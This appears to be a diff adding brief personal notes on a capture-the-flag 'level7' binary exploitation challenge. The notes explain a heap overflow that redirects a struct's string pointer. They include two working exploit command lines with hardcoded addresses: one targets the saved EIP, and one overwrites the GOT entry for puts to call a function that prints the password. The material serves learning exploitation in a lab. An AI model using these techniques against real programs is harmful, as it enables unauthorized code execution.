@@ -1,0 +1,19 @@
+Buffer Overflow
+
+struct a :id, str
+struct b :id, str
+struct a str a struct b str b
+
+
+sooo we have 2 arguments and we can just say hey use the first argument 
+to overflow onto the 2argument (who will be stock in struct b->str) 
+adresse to make this will (so actually we are just making struct b ->str point elsewhere)
+checking with gdb to find the malloc pointer that are used to redirect the address
+struct a -> str is 20 letter away from struct b pointer to str
+by doing so we ca make it point to the eip of main, and tell him to run the m function
+giving us the password
+./level7 $(python -c 'print "A"*20+"\x2c\xfe\xff\xbf"+" "+"\xf4\x84\x04\x08"')
+
+in the end we did try with eip but it didn't show password
+so we change our aim to attack on GOT Puts by replacing it by m
+./level7 $(python -c 'print "A"*20+"\x28\x99\x04\x08"+" "+"\xf4\x84\x04\x08"')
